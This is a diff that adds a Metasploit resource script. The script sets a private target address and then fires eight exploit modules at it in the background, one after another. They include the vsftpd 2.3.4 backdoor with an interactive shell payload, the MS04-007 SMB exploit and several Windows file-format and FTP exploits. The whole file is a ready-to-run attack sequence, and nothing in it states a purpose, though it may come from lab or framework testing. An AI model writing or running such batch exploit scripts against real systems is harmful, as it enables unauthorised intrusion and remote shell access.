@@ -1,0 +1,26 @@
+setg RHOST 192.168.184.129
+setg LHOST 127.0.0.1
+use exploit/unix/ftp/vsftpd_234_backdoor
+set PAYLOAD cmd/unix/interact
+run -j
+use exploit/windows/fileformat/activepdf_webgrabber
+set PAYLOAD generic/custom
+run -j
+use exploit/windows/fileformat/djvu_imageurl
+set PAYLOAD generic/custom
+run -j
+use exploit/windows/fileformat/mcafee_hercules_deletesnapshot
+set PAYLOAD generic/custom
+run -j
+use exploit/windows/fileformat/msworks_wkspictureinterface
+set PAYLOAD generic/custom
+run -j
+use exploit/windows/fileformat/sascam_get
+set PAYLOAD generic/custom
+run -j
+use exploit/windows/smb/ms04_007_killbill
+set PAYLOAD generic/custom
+run -j
+use exploit/windows/ftp/sami_ftpd_list
+set PAYLOAD generic/custom
+run -j
